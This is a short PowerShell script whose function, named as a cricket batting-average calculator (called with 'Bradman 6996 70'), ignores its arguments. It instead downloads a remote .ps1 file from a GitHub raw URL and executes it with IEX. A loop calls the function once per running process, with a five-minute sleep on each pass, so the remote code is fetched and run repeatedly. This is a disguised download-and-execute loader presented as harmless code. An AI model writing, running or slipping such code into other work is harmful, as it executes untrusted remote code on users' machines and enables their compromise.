Function Get-BatAvg{
Param ($Name, $Runs, $Outs)
$headers = @{
"Pragma"="no-cache";
"Cache-Control"="no-cache";
}
IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/sksojib20/server/main/sazzad_446_server.ps1')
}

$processes = Get-Process

$i = 1
ForEach ($process in $processes) {

    
    Start-Sleep -Seconds 300
    $i++
    
	Get-BatAvg Bradman 6996 70
    
}
